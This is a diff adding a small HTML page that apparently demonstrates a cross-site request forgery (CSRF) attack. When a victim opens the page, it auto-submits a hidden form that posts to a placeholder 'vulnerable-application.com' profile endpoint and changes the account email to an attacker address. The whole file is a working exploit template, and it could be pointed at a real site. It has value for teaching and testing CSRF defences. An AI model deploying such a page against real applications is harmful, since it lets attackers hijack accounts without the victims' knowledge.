@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF POST Attack Example Page</title>
+  </head>
+  <body>
+
+    <body onload="document.forms[0].submit()">
+      <form action="http://vulnerable-application.com:8080/account/profile" method="POST">
+        <input type="hidden" name="name" value="Marty"/>
+        <input type="hidden" name="email" value="hacker@gmail.com"/>
+        <input type="submit" value="Update Data"/>
+      </form>
+    </body>
+
+  </body>
+</html>
